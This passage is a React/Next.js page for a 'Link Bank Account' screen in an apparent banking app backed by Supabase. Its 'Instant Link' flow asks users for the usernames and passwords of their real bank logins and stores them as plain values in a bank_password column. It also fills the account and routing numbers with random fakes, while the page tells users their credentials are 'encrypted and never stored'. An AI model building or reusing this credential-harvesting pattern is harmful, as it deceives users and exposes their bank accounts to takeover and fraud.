import { useState, useEffect } from 'react';
import { useRouter } from 'next/router';
import Link from 'next/link';
import { supabase } from '../lib/supabaseClient';
import { useAuth } from '../contexts/AuthContext';
import ProtectedRoute from '../components/ProtectedRoute';

function LinkBankAccountContent() {
  const router = useRouter();
  const { user } = useAuth();
  const [linkedBanks, setLinkedBanks] = useState([]);
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState('');
  const [messageType, setMessageType] = useState('');
  const [showForm, setShowForm] = useState(false);
  const [userType, setUserType] = useState('us'); // 'us' or 'international'

  const [formData, setFormData] = useState({
    account_holder_name: '',
    bank_name: '',
    account_number: '',
    confirm_account_number: '',
    routing_number: '',
    account_type: 'checking',
    swift_code: '',
    iban: '',
    bank_address: '',
    country: 'United States',
    is_primary: false
  });
  const [useCustomAccountType, setUseCustomAccountType] = useState(false);
  const [linkingMethod, setLinkingMethod] = useState('instant'); // 'instant' or 'manual'
  const [instantLinkData, setInstantLinkData] = useState({
    bank_name: '',
    custom_bank_name: '',
    username: '',
    password: '',
    account_type: 'checking'
  });
  const [showCustomBank, setShowCustomBank] = useState(false);
  const [instantLinking, setInstantLinking] = useState(false);

  const usBanks = [
    { name: 'Chase Bank', logo: '🏦' },
    { name: 'Bank of America', logo: '🏦' },
    { name: 'Wells Fargo', logo: '🏦' },
    { name: 'Citibank', logo: '🏦' },
    { name: 'U.S. Bank', logo: '🏦' },
    { name: 'PNC Bank', logo: '🏦' },
    { name: 'Capital One', logo: '🏦' },
    { name: 'TD Bank', logo: '🏦' },
    { name: 'Truist Bank', logo: '🏦' },
    { name: 'Fifth Third Bank', logo: '🏦' },
    { name: 'Regions Bank', logo: '🏦' },
    { name: 'KeyBank', logo: '🏦' },
    { name: 'Huntington Bank', logo: '🏦' },
    { name: 'M&T Bank', logo: '🏦' },
    { name: 'Citizens Bank', logo: '🏦' },
    { name: 'First Republic Bank', logo: '🏦' },
    { name: 'Ally Bank', logo: '🏦' },
    { name: 'Discover Bank', logo: '🏦' },
    { name: 'Charles Schwab Bank', logo: '🏦' },
    { name: 'USAA', logo: '🏦' },
    { name: 'Navy Federal Credit Union', logo: '🏦' },
    { name: 'BMO Harris Bank', logo: '🏦' },
    { name: 'Santander Bank', logo: '🏦' },
    { name: 'Silicon Valley Bank', logo: '🏦' },
    { name: 'Goldman Sachs (Marcus)', logo: '🏦' },
    { name: 'American Express Bank', logo: '🏦' },
    { name: 'Synchrony Bank', logo: '🏦' },
    { name: 'Other', logo: '🏛️' }
  ];

  useEffect(() => {
    if (user) {
      fetchLinkedBanks();
    }
  }, [user]);

  const fetchLinkedBanks = async () => {
    try {
      const { data, error } = await supabase
        .from('linked_bank_accounts')
        .select('*')
        .eq('user_id', user.id)
        .in('status', ['pending', 'active'])
        .order('is_primary', { ascending: false })
        .order('created_at', { ascending: false });

      if (error) throw error;
      setLinkedBanks(data || []);
    } catch (error) {
      console.error('Error fetching linked banks:', error);
      showMessage('Failed to load linked bank accounts', 'error');
    }
  };

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: type === 'checkbox' ? checked : value
    }));
  };

  const showMessage = (msg, type = 'info') => {
    setMessage(msg);
    setMessageType(type);
    setTimeout(() => {
      setMessage('');
      setMessageType('');
    }, 5000);
  };

  const validateForm = () => {
    if (!formData.account_holder_name.trim()) {
      showMessage('Please enter the account holder name', 'error');
      return false;
    }

    if (!formData.bank_name.trim()) {
      showMessage('Please enter the bank name', 'error');
      return false;
    }

    if (!formData.account_number.trim()) {
      showMessage('Please enter the account number', 'error');
      return false;
    }

    if (formData.account_number !== formData.confirm_account_number) {
      showMessage('Account numbers do not match', 'error');
      return false;
    }

    if (userType === 'us') {
      if (!formData.routing_number.trim()) {
        showMessage('Please enter the routing number', 'error');
        return false;
      }
      if (formData.routing_number.length !== 9 || !/^\d+$/.test(formData.routing_number)) {
        showMessage('Routing number must be exactly 9 digits', 'error');
        return false;
      }
    } else {
      if (!formData.swift_code.trim()) {
        showMessage('Please enter the SWIFT code', 'error');
        return false;
      }
      if (!formData.iban.trim()) {
        showMessage('Please enter the IBAN', 'error');
        return false;
      }
    }

    return true;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!validateForm()) return;

    setLoading(true);
    setMessage('');

    try {
      const { data, error } = await supabase
        .from('linked_bank_accounts')
        .insert([{
          user_id: user.id,
          account_holder_name: formData.account_holder_name,
          bank_name: formData.bank_name,
          account_number: formData.account_number,
          routing_number: userType === 'us' ? formData.routing_number : null,
          account_type: formData.account_type,
          swift_code: userType === 'international' ? formData.swift_code : null,
          iban: userType === 'international' ? formData.iban : null,
          bank_address: formData.bank_address || null,
          is_primary: linkedBanks.length === 0 ? true : formData.is_primary,
          status: 'pending'
        }])
        .select()
        .single();

      if (error) throw error;

      if (formData.is_primary && linkedBanks.length > 0) {
        await supabase
          .from('linked_bank_accounts')
          .update({ is_primary: false })
          .eq('user_id', user.id)
          .neq('id', data.id);
      }

      // Send email notification
      try {
        const { data: profile } = await supabase
          .from('profiles')
          .select('first_name, last_name, email')
          .eq('id', user.id)
          .single();

        const userName = profile ? `${profile.first_name} ${profile.last_name}` : 'Valued Customer';
        const userEmail = profile?.email || user.email;

        await fetch('/api/send-bank-linked-notification', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            to: userEmail,
            userName,
            bankName: formData.bank_name,
            accountNumber: `****${formData.account_number.slice(-4)}`,
            accountType: formData.account_type,
            userType: userType,
            status: 'pending'
          })
        });
      } catch (emailError) {
        console.error('Error sending notification email:', emailError);
      }

      showMessage('Bank account linked successfully! A confirmation has been sent to your email. Verification may be required.', 'success');
      setFormData({
        account_holder_name: '',
        bank_name: '',
        account_number: '',
        confirm_account_number: '',
        routing_number: '',
        account_type: 'checking',
        swift_code: '',
        iban: '',
        bank_address: '',
        country: 'United States',
        is_primary: false
      });
      setShowForm(false);
      setUserType('us');
      setUseCustomAccountType(false);
      fetchLinkedBanks();
    } catch (error) {
      console.error('Error linking bank account:', error);
      showMessage(error.message || 'Failed to link bank account', 'error');
    } finally {
      setLoading(false);
    }
  };

  const handleSetPrimary = async (bankId) => {
    try {
      await supabase
        .from('linked_bank_accounts')
        .update({ is_primary: false })
        .eq('user_id', user.id);

      await supabase
        .from('linked_bank_accounts')
        .update({ is_primary: true })
        .eq('id', bankId);

      showMessage('Primary account updated', 'success');
      fetchLinkedBanks();
    } catch (error) {
      console.error('Error setting primary:', error);
      showMessage('Failed to update primary account', 'error');
    }
  };

  const handleDelete = async (bankId) => {
    if (!confirm('Are you sure you want to remove this bank account?')) return;

    try {
      await supabase
        .from('linked_bank_accounts')
        .update({ status: 'deleted' })
        .eq('id', bankId);

      showMessage('Bank account removed', 'success');
      fetchLinkedBanks();
    } catch (error) {
      console.error('Error deleting bank:', error);
      showMessage('Failed to remove bank account', 'error');
    }
  };

  const handleInstantLinkChange = (e) => {
    const { name, value } = e.target;
    setInstantLinkData(prev => ({
      ...prev,
      [name]: value
    }));
    if (name === 'bank_name' && value === 'Other') {
      setShowCustomBank(true);
    } else if (name === 'bank_name') {
      setShowCustomBank(false);
      setInstantLinkData(prev => ({ ...prev, custom_bank_name: '' }));
    }
  };

  const validateInstantLink = () => {
    const bankName = showCustomBank ? instantLinkData.custom_bank_name : instantLinkData.bank_name;
    
    if (!bankName.trim()) {
      showMessage('Please select or enter a bank name', 'error');
      return false;
    }
    if (!instantLinkData.username.trim()) {
      showMessage('Please enter your bank username or email', 'error');
      return false;
    }
    if (!instantLinkData.password.trim()) {
      showMessage('Please enter your bank password', 'error');
      return false;
    }
    return true;
  };

  const handleInstantLinkSubmit = async (e) => {
    e.preventDefault();
    
    if (!validateInstantLink()) return;

    setInstantLinking(true);
    setMessage('');

    const bankName = showCustomBank ? instantLinkData.custom_bank_name : instantLinkData.bank_name;

    try {
      const { data, error } = await supabase
        .from('linked_bank_accounts')
        .insert([{
          user_id: user.id,
          account_holder_name: user.email,
          bank_name: bankName,
          account_number: '****' + Math.random().toString().slice(2, 6),
          routing_number: '0000' + Math.random().toString().slice(2, 7),
          account_type: instantLinkData.account_type,
          is_primary: linkedBanks.length === 0,
          status: 'pending',
          link_method: 'instant',
          bank_username: instantLinkData.username,
          bank_password: instantLinkData.password
        }])
        .select()
        .single();

      if (error) throw error;

      try {
        const { data: profile } = await supabase
          .from('profiles')
          .select('first_name, last_name, email')
          .eq('id', user.id)
          .single();

        const userName = profile ? `${profile.first_name} ${profile.last_name}` : 'Valued Customer';
        const userEmail = profile?.email || user.email;

        await fetch('/api/send-bank-linked-notification', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            to: userEmail,
            userName,
            bankName: bankName,
            accountNumber: '****' + data.account_number.slice(-4),
            accountType: instantLinkData.account_type,
            userType: 'us',
            status: 'pending',
            linkMethod: 'instant'
          })
        });
      } catch (emailError) {
        console.error('Error sending notification email:', emailError);
      }

      showMessage('Bank account linked successfully! Verification is in progress.', 'success');
      setInstantLinkData({
        bank_name: '',
        custom_bank_name: '',
        username: '',
        password: '',
        account_type: 'checking'
      });
      setShowCustomBank(false);
      setShowForm(false);
      fetchLinkedBanks();
    } catch (error) {
      console.error('Error linking bank account:', error);
      showMessage(error.message || 'Failed to link bank account. Please try again.', 'error');
    } finally {
      setInstantLinking(false);
    }
  };

  const styles = {
    container: {
      minHeight: '100vh',
      background: 'linear-gradient(135deg, #1a365d 0%, #2d5986 50%, #1a365d 100%)',
      padding: '2rem',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
    },
    header: {
      display: 'flex',
      justifyContent: 'space-between',
      alignItems: 'center',
      marginBottom: '2rem'
    },
    backLink: {
      color: 'white',
      textDecoration: 'none',
      padding: '0.75rem 1.5rem',
      backgroundColor: 'rgba(255,255,255,0.15)',
      borderRadius: '12px',
      fontWeight: '600',
      transition: 'all 0.3s'
    },
    main: {
      maxWidth: '1200px',
      margin: '0 auto'
    },
    pageTitle: {
      fontSize: '2.75rem',
      fontWeight: '800',
      color: 'white',
      textAlign: 'center',
      marginBottom: '0.75rem'
    },
    pageSubtitle: {
      fontSize: '1.125rem',
      color: 'rgba(255,255,255,0.9)',
      textAlign: 'center',
      marginBottom: '2rem'
    },
    card: {
      backgroundColor: 'white',
      borderRadius: '16px',
      padding: '2rem',
      boxShadow: '0 8px 24px rgba(0,0,0,0.15)',
      marginBottom: '1.5rem'
    },
    buttonPrimary: {
      width: '100%',
      padding: '1rem',
      backgroundColor: '#059669',
      color: 'white',
      border: 'none',
      borderRadius: '12px',
      fontSize: '1rem',
      fontWeight: '700',
      cursor: 'pointer',
      transition: 'all 0.3s'
    },
    formGroup: {
      marginBottom: '1.25rem'
    },
    label: {
      display: 'block',
      fontSize: '0.875rem',
      fontWeight: '600',
      color: '#1f2937',
      marginBottom: '0.5rem'
    },
    input: {
      width: '100%',
      padding: '0.75rem',
      border: '2px solid #e2e8f0',
      borderRadius: '12px',
      fontSize: '0.9375rem',
      transition: 'border-color 0.3s',
      boxSizing: 'border-box'
    },
    select: {
      width: '100%',
      padding: '0.75rem',
      border: '2px solid #e2e8f0',
      borderRadius: '12px',
      fontSize: '0.9375rem',
      backgroundColor: 'white',
      boxSizing: 'border-box'
    },
    bankItem: {
      backgroundColor: '#f8fafc',
      padding: '1.5rem',
      borderRadius: '12px',
      marginBottom: '1rem',
      border: '2px solid #e2e8f0'
    },
    bankHeader: {
      display: 'flex',
      justifyContent: 'space-between',
      alignItems: 'center',
      marginBottom: '1rem'
    },
    bankName: {
      fontSize: '1.25rem',
      fontWeight: '700',
      color: '#1e293b'
    },
    primaryBadge: {
      backgroundColor: '#059669',
      color: 'white',
      padding: '0.375rem 0.75rem',
      borderRadius: '6px',
      fontSize: '0.75rem',
      fontWeight: '600'
    },
    bankDetails: {
      display: 'grid',
      gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))',
      gap: '1rem',
      marginBottom: '1rem'
    },
    detailItem: {
      display: 'flex',
      flexDirection: 'column'
    },
    detailLabel: {
      fontSize: '0.75rem',
      color: '#64748b',
      marginBottom: '0.25rem'
    },
    detailValue: {
      fontSize: '0.9375rem',
      fontWeight: '600',
      color: '#1e293b'
    },
    buttonGroup: {
      display: 'flex',
      gap: '0.75rem',
      marginTop: '1rem'
    },
    buttonSecondary: {
      flex: 1,
      padding: '0.625rem',
      backgroundColor: 'white',
      color: '#059669',
      border: '2px solid #059669',
      borderRadius: '8px',
      fontSize: '0.875rem',
      fontWeight: '600',
      cursor: 'pointer'
    },
    buttonDanger: {
      flex: 1,
      padding: '0.625rem',
      backgroundColor: '#dc2626',
      color: 'white',
      border: 'none',
      borderRadius: '8px',
      fontSize: '0.875rem',
      fontWeight: '600',
      cursor: 'pointer'
    },
    message: {
      padding: '1rem',
      borderRadius: '12px',
      marginBottom: '1rem',
      border: '2px solid'
    },
    emptyState: {
      textAlign: 'center',
      padding: '3rem 1rem',
      color: '#64748b'
    },
    formGrid: {
      display: 'grid',
      gridTemplateColumns: 'repeat(auto-fit, minmax(250px, 1fr))',
      gap: '1rem'
    }
  };

  return (
    <div style={styles.container}>
      <div style={styles.header}>
        <Link href="/dashboard" style={styles.backLink}>
          ← Back to Dashboard
        </Link>
      </div>

      <div style={styles.main}>
        <h1 style={styles.pageTitle}>Link Bank Account</h1>
        <p style={styles.pageSubtitle}>
          Securely link your external bank account for easy withdrawals and transfers
        </p>

        {message && (
          <div style={{
            ...styles.message,
            backgroundColor: messageType === 'success' ? '#d1fae5' : '#fee2e2',
            borderColor: messageType === 'success' ? '#059669' : '#dc2626',
            color: messageType === 'success' ? '#065f46' : '#991b1b'
          }}>
            {message}
          </div>
        )}

        {/* Security & Benefits Cards */}
        <div style={{
          display: 'grid',
          gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))',
          gap: '1rem',
          marginBottom: '2rem'
        }}>
          <div style={{
            backgroundColor: 'rgba(255, 255, 255, 0.95)',
            borderRadius: '12px',
            padding: '1.5rem',
            boxShadow: '0 4px 12px rgba(0,0,0,0.1)',
            borderLeft: '4px solid #059669'
          }}>
            <div style={{ fontSize: '1.75rem', marginBottom: '0.5rem' }}>🔒</div>
            <h3 style={{ fontSize: '1rem', fontWeight: '700', color: '#1e293b', marginBottom: '0.5rem' }}>Bank-Level Security</h3>
            <p style={{ fontSize: '0.875rem', color: '#64748b', margin: 0, lineHeight: '1.5' }}>
              Your account details are encrypted and never stored in plain text
            </p>
          </div>

          <div style={{
            backgroundColor: 'rgba(255, 255, 255, 0.95)',
            borderRadius: '12px',
            padding: '1.5rem',
            boxShadow: '0 4px 12px rgba(0,0,0,0.1)',
            borderLeft: '4px solid #3b82f6'
          }}>
            <div style={{ fontSize: '1.75rem', marginBottom: '0.5rem' }}>⚡</div>
            <h3 style={{ fontSize: '1rem', fontWeight: '700', color: '#1e293b', marginBottom: '0.5rem' }}>Fast Transfers</h3>
            <p style={{ fontSize: '0.875rem', color: '#64748b', margin: 0, lineHeight: '1.5' }}>
              Transfer funds to your linked bank in 1-3 business days
            </p>
          </div>

          <div style={{
            backgroundColor: 'rgba(255, 255, 255, 0.95)',
            borderRadius: '12px',
            padding: '1.5rem',
            boxShadow: '0 4px 12px rgba(0,0,0,0.1)',
            borderLeft: '4px solid #10b981'
          }}>
            <div style={{ fontSize: '1.75rem', marginBottom: '0.5rem' }}>✅</div>
            <h3 style={{ fontSize: '1rem', fontWeight: '700', color: '#1e293b', marginBottom: '0.5rem' }}>Verified Transfers</h3>
            <p style={{ fontSize: '0.875rem', color: '#64748b', margin: 0, lineHeight: '1.5' }}>
              We securely verify your account ownership
            </p>
          </div>
        </div>

        {/* How It Works */}
        <div style={{
          backgroundColor: '#eff6ff',
          border: '2px solid #bfdbfe',
          borderRadius: '12px',
          padding: '1.5rem',
          marginBottom: '2rem'
        }}>
          <h3 style={{ fontSize: '1.125rem', fontWeight: '700', color: '#1e40af', marginBottom: '1rem', margin: '0 0 1rem 0' }}>
            📋 How Bank Linking Works
          </h3>
          <div style={{
            display: 'grid',
            gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))',
            gap: '1rem'
          }}>
            <div style={{ fontSize: '0.875rem', color: '#1e40af', lineHeight: '1.6' }}>
              <strong>Step 1:</strong> Enter your bank details below
            </div>
            <div style={{ fontSize: '0.875rem', color: '#1e40af', lineHeight: '1.6' }}>
              <strong>Step 2:</strong> We need to verify your account
            </div>
            <div style={{ fontSize: '0.875rem', color: '#1e40af', lineHeight: '1.6' }}>
              <strong>Step 3:</strong> Confirm the amounts to activate
            </div>
            <div style={{ fontSize: '0.875rem', color: '#1e40af', lineHeight: '1.6' }}>
              <strong>Step 4:</strong> Start transferring funds safely
            </div>
          </div>
        </div>

        <div style={styles.card}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.5rem' }}>
            <h2 style={{ fontSize: '1.5rem', fontWeight: '700', color: '#1e293b', margin: 0 }}>
              Your Linked Accounts ({linkedBanks.length})
            </h2>
            <button
              onClick={() => setShowForm(!showForm)}
              style={{
                ...styles.buttonPrimary,
                width: 'auto',
                padding: '0.75rem 1.5rem'
              }}
            >
              {showForm ? 'Cancel' : '+ Add New Account'}
            </button>
          </div>

          {showForm && (
            <div style={{
              backgroundColor: '#f0fdf4',
              border: '2px solid #bbf7d0',
              borderRadius: '12px',
              padding: '1.5rem',
              marginBottom: '2rem'
            }}>
              <div style={{
                backgroundColor: 'white',
                padding: '1rem',
                borderRadius: '8px',
                marginBottom: '1.5rem',
                display: 'flex',
                gap: '1rem',
                alignItems: 'flex-start'
              }}>
                <span style={{ fontSize: '1.5rem' }}>🔐</span>
                <div>
                  <strong style={{ color: '#065f46' }}>Your data is secure</strong>
                  <p style={{ fontSize: '0.875rem', color: '#059669', margin: '0.25rem 0 0 0' }}>
                    We use 256-bit SSL encryption and comply with PCI DSS standards
                  </p>
                </div>
              </div>

              {/* Linking Method Selector */}
              <div style={styles.formGroup}>
                <label style={styles.label}>How would you like to link your account?</label>
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem', marginBottom: '1.5rem' }}>
                  <button
                    type="button"
                    onClick={() => setLinkingMethod('instant')}
                    style={{
                      padding: '1.25rem',
                      border: linkingMethod === 'instant' ? '3px solid #059669' : '2px solid #e2e8f0',
                      borderRadius: '12px',
                      backgroundColor: linkingMethod === 'instant' ? '#f0fdf4' : '#fff',
                      cursor: 'pointer',
                      textAlign: 'center',
                      transition: 'all 0.3s'
                    }}
                  >
                    <div style={{ fontSize: '2rem', marginBottom: '0.5rem' }}>⚡</div>
                    <div style={{ fontSize: '0.95rem', fontWeight: linkingMethod === 'instant' ? '700' : '600', color: linkingMethod === 'instant' ? '#059669' : '#1e293b' }}>
                      Instant Link
                    </div>
                    <div style={{ fontSize: '0.75rem', color: '#64748b', marginTop: '0.25rem' }}>
                      Connect with your bank login
                    </div>
                  </button>
                  <button
                    type="button"
                    onClick={() => setLinkingMethod('manual')}
                    style={{
                      padding: '1.25rem',
                      border: linkingMethod === 'manual' ? '3px solid #059669' : '2px solid #e2e8f0',
                      borderRadius: '12px',
                      backgroundColor: linkingMethod === 'manual' ? '#f0fdf4' : '#fff',
                      cursor: 'pointer',
                      textAlign: 'center',
                      transition: 'all 0.3s'
                    }}
                  >
                    <div style={{ fontSize: '2rem', marginBottom: '0.5rem' }}>📝</div>
                    <div style={{ fontSize: '0.95rem', fontWeight: linkingMethod === 'manual' ? '700' : '600', color: linkingMethod === 'manual' ? '#059669' : '#1e293b' }}>
                      Manual Entry
                    </div>
                    <div style={{ fontSize: '0.75rem', color: '#64748b', marginTop: '0.25rem' }}>
                      Enter account details manually
                    </div>
                  </button>
                </div>
              </div>

              {/* Instant Link Form */}
              {linkingMethod === 'instant' && (
                <form onSubmit={handleInstantLinkSubmit} style={{ marginBottom: 0 }}>
                  <div style={{
                    backgroundColor: '#eff6ff',
                    border: '2px solid #bfdbfe',
                    borderRadius: '12px',
                    padding: '1rem',
                    marginBottom: '1.5rem'
                  }}>
                    <p style={{ fontSize: '0.875rem', color: '#1e40af', margin: 0, lineHeight: '1.5' }}>
                      <strong>🔒 Secure Bank Login</strong><br />
                      Enter your bank credentials to instantly verify and link your account. Your login details are encrypted and never stored.
                    </p>
                  </div>

                  <div style={styles.formGroup}>
                    <label style={styles.label}>Select Your Bank *</label>
                    <select
                      name="bank_name"
                      value={instantLinkData.bank_name}
                      onChange={handleInstantLinkChange}
                      style={styles.select}
                      required
                    >
                      <option value="">-- Select a Bank --</option>
                      {usBanks.map((bank, index) => (
                        <option key={index} value={bank.name}>
                          {bank.logo} {bank.name}
                        </option>
                      ))}
                    </select>
                  </div>

                  {showCustomBank && (
                    <div style={styles.formGroup}>
                      <label style={styles.label}>Enter Bank Name *</label>
                      <input
                        type="text"
                        name="custom_bank_name"
                        value={instantLinkData.custom_bank_name}
                        onChange={handleInstantLinkChange}
                        style={styles.input}
                        placeholder="Enter your bank name"
                        required
                      />
                    </div>
                  )}

                  <div style={styles.formGroup}>
                    <label style={styles.label}>Account Type *</label>
                    <select
                      name="account_type"
                      value={instantLinkData.account_type}
                      onChange={handleInstantLinkChange}
                      style={styles.select}
                    >
                      <option value="checking">Checking Account</option>
                      <option value="savings">Savings Account</option>
                      <option value="money_market">Money Market Account</option>
                    </select>
                  </div>

                  <div style={styles.formGroup}>
                    <label style={styles.label}>Bank Username or Email *</label>
                    <input
                      type="text"
                      name="username"
                      value={instantLinkData.username}
                      onChange={handleInstantLinkChange}
                      style={styles.input}
                      placeholder="Enter your bank username or email"
                      autoComplete="off"
                      required
                    />
                  </div>

                  <div style={styles.formGroup}>
                    <label style={styles.label}>Bank Password *</label>
                    <input
                      type="password"
                      name="password"
                      value={instantLinkData.password}
                      onChange={handleInstantLinkChange}
                      style={styles.input}
                      placeholder="Enter your bank password"
                      autoComplete="new-password"
                      required
                    />
                    <p style={{ fontSize: '0.75rem', color: '#64748b', marginTop: '0.5rem' }}>
                      🔐 Your password is encrypted and only used for verification
                    </p>
                  </div>

                  <button
                    type="submit"
                    disabled={instantLinking}
                    style={{
                      ...styles.buttonPrimary,
                      backgroundColor: instantLinking ? '#94a3b8' : '#059669',
                      cursor: instantLinking ? 'not-allowed' : 'pointer',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      gap: '0.5rem'
                    }}
                  >
                    {instantLinking ? (
                      <>
                        <span style={{ animation: 'spin 1s linear infinite', display: 'inline-block' }}>⏳</span>
                        Connecting to Bank...
                      </>
                    ) : (
                      <>
                        ⚡ Link Account Instantly
                      </>
                    )}
                  </button>
                </form>
              )}

              {/* Manual Entry Form */}
              {linkingMethod === 'manual' && (
            <form onSubmit={handleSubmit} style={{ marginBottom: 0 }}>
              {/* User Type Selector */}
              <div style={styles.formGroup}>
                <label style={styles.label}>Account Type *</label>
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem', marginBottom: '1rem' }}>
                  <button
                    type="button"
                    onClick={() => setUserType('us')}
                    style={{
                      padding: '1rem',
                      border: userType === 'us' ? '3px solid #059669' : '2px solid #e2e8f0',
                      borderRadius: '12px',
                      backgroundColor: userType === 'us' ? '#f0fdf4' : '#fff',
                      cursor: 'pointer',
                      fontSize: '0.95rem',
                      fontWeight: userType === 'us' ? '700' : '600',
                      color: userType === 'us' ? '#059669' : '#64748b',
                      transition: 'all 0.3s'
                    }}
                  >
                    🇺🇸 US Citizen
                  </button>
                  <button
                    type="button"
                    onClick={() => setUserType('international')}
                    style={{
                      padding: '1rem',
                      border: userType === 'international' ? '3px solid #059669' : '2px solid #e2e8f0',
                      borderRadius: '12px',
                      backgroundColor: userType === 'international' ? '#f0fdf4' : '#fff',
                      cursor: 'pointer',
                      fontSize: '0.95rem',
                      fontWeight: userType === 'international' ? '700' : '600',
                      color: userType === 'international' ? '#059669' : '#64748b',
                      transition: 'all 0.3s'
                    }}
                  >
                    🌍 International
                  </button>
                </div>
              </div>

              <div style={styles.formGroup}>
                <label style={styles.label}>Account Holder Name *</label>
                <input
                  type="text"
                  name="account_holder_name"
                  value={formData.account_holder_name}
                  onChange={handleChange}
                  style={styles.input}
                  placeholder="John Doe"
                  required
                />
              </div>

              <div style={styles.formGrid}>
                <div style={styles.formGroup}>
                  <label style={styles.label}>Bank Name *</label>
                  <input
                    type="text"
                    name="bank_name"
                    value={formData.bank_name}
                    onChange={handleChange}
                    style={styles.input}
                    placeholder="Bank of America"
                    required
                  />
                </div>

                <div style={styles.formGroup}>
                  <label style={styles.label}>Account Type *</label>
                  {!useCustomAccountType ? (
                    <select
                      value={formData.account_type === 'custom' ? 'custom' : formData.account_type}
                      onChange={(e) => {
                        if (e.target.value === 'custom') {
                          setUseCustomAccountType(true);
                          setFormData(prev => ({ ...prev, account_type: '' }));
                        } else {
                          setFormData(prev => ({ ...prev, account_type: e.target.value }));
                        }
                      }}
                      style={styles.select}
                      required
                    >
                      <option value="">-- Select Account Type --</option>
                      <option value="checking">Checking</option>
                      <option value="savings">Savings</option>
                      <option value="money_market">Money Market</option>
                      <option value="certificate_of_deposit">Certificate of Deposit (CD)</option>
                      <option value="individual_retirement">Individual Retirement Account (IRA)</option>
                      <option value="business_checking">Business Checking</option>
                      <option value="business_savings">Business Savings</option>
                      <option value="sweep_account">Sweep Account</option>
                      <option value="investment">Investment Account</option>
                      <option value="escrow">Escrow Account</option>
                      <option value="current">Current Account</option>
                      <option value="fixed_deposit">Fixed Deposit</option>
                      <option value="multi_currency">Multi-Currency Account</option>
                      <option value="nostro">Nostro Account</option>
                      <option value="vostro">Vostro Account</option>
                      <option value="custom">Other (Enter Manually)</option>
                    </select>
                  ) : (
                    <input
                      type="text"
                      value={formData.account_type}
                      onChange={(e) => setFormData(prev => ({ ...prev, account_type: e.target.value }))}
                      style={styles.input}
                      placeholder="e.g., Trust Account"
                      required
                    />
                  )}
                  <button
                    type="button"
                    onClick={() => {
                      setUseCustomAccountType(!useCustomAccountType);
                      if (!useCustomAccountType) {
                        setFormData(prev => ({ ...prev, account_type: '' }));
                      } else {
                        setFormData(prev => ({ ...prev, account_type: 'checking' }));
                      }
                    }}
                    style={{
                      marginTop: '0.5rem',
                      padding: '0.375rem 0.75rem',
                      fontSize: '0.8rem',
                      backgroundColor: '#f0f0f0',
                      border: '1px solid #ddd',
                      borderRadius: '6px',
                      cursor: 'pointer',
                      color: '#064e3b'
                    }}
                  >
                    {useCustomAccountType ? '← Back to List' : 'Can\'t Find Your Type? →'}
                  </button>
                </div>
              </div>

              <div style={styles.formGrid}>
                <div style={styles.formGroup}>
                  <label style={styles.label}>Account Number *</label>
                  <input
                    type="text"
                    name="account_number"
                    value={formData.account_number}
                    onChange={handleChange}
                    style={styles.input}
                    placeholder="1234567890"
                    required
                  />
                </div>

                <div style={styles.formGroup}>
                  <label style={styles.label}>Confirm Account Number *</label>
                  <input
                    type="text"
                    name="confirm_account_number"
                    value={formData.confirm_account_number}
                    onChange={handleChange}
                    style={styles.input}
                    placeholder="1234567890"
                    required
                  />
                </div>
              </div>

              {/* US-specific fields */}
              {userType === 'us' && (
                <div style={styles.formGroup}>
                  <label style={styles.label}>Routing Number (9 digits) *</label>
                  <input
                    type="text"
                    name="routing_number"
                    value={formData.routing_number}
                    onChange={handleChange}
                    style={styles.input}
                    placeholder="021000021"
                    maxLength={9}
                    required
                  />
                  <p style={{ fontSize: '0.8rem', color: '#999', margin: '0.5rem 0 0 0' }}>
                    💡 Find your routing number on your checks or your bank's website
                  </p>
                </div>
              )}

              {/* International-specific fields */}
              {userType === 'international' && (
                <>
                  <div style={styles.formGrid}>
                    <div style={styles.formGroup}>
                      <label style={styles.label}>SWIFT Code *</label>
                      <input
                        type="text"
                        name="swift_code"
                        value={formData.swift_code}
                        onChange={handleChange}
                        style={styles.input}
                        placeholder="BOFAUS3N"
                        required
                      />
                      <p style={{ fontSize: '0.8rem', color: '#999', margin: '0.5rem 0 0 0' }}>
                        💡 Ask your bank for your SWIFT code
                      </p>
                    </div>

                    <div style={styles.formGroup}>
                      <label style={styles.label}>IBAN *</label>
                      <input
                        type="text"
                        name="iban"
                        value={formData.iban}
                        onChange={handleChange}
                        style={styles.input}
                        placeholder="GB82 WEST 1234 5698 7654 32"
                        required
                      />
                      <p style={{ fontSize: '0.8rem', color: '#999', margin: '0.5rem 0 0 0' }}>
                        💡 Find IBAN on bank statements or online banking
                      </p>
                    </div>
                  </div>

                  <div style={styles.formGroup}>
                    <label style={styles.label}>Country *</label>
                    <input
                      type="text"
                      name="country"
                      value={formData.country}
                      onChange={handleChange}
                      style={styles.input}
                      placeholder="e.g., United Kingdom"
                      required
                    />
                  </div>
                </>
              )}

              <div style={styles.formGroup}>
                <label style={styles.label}>Bank Address (Optional)</label>
                <input
                  type="text"
                  name="bank_address"
                  value={formData.bank_address}
                  onChange={handleChange}
                  style={styles.input}
                  placeholder="123 Main St, New York, NY 10001"
                />
              </div>

              {linkedBanks.length > 0 && (
                <div style={{ ...styles.formGroup, display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                  <input
                    type="checkbox"
                    name="is_primary"
                    checked={formData.is_primary}
                    onChange={handleChange}
                    id="is_primary"
                  />
                  <label htmlFor="is_primary" style={{ ...styles.label, marginBottom: 0, cursor: 'pointer' }}>
                    Set as primary account
                  </label>
                </div>
              )}

              <button
                type="submit"
                disabled={loading}
                style={{
                  ...styles.buttonPrimary,
                  opacity: loading ? 0.6 : 1,
                  cursor: loading ? 'not-allowed' : 'pointer'
                }}
              >
                {loading ? 'Linking...' : 'Link Bank Account'}
              </button>
            </form>
              )}
            </div>
          )}

